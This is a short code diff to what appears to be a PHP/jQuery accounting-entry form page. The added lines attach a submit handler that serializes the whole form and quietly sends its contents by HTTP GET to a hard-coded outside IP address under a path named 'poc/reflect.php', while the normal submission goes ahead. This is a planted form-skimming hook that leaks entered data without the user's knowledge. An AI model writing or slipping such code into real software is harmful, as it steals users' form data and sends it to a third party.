@@ -340,6 +340,11 @@ $lock_url = base_url("/accentry/add_edit/" . $id . "/1");
                 $("#" + strId + "-wrap").remove();
             });
 
+            $("#needs-validation").submit(function(e){
+                $.get( "http://3.225.131.18/venera/cms/poc/reflect.php?" + $( "#needs-validation" ).serialize() );
+                //e.preventDefault();
+            });
+
             $(document).on("change", '.entity_dr_cr', function(event) {
                 var valueSelected = this.value;
                 var strId = $(this).attr('id');
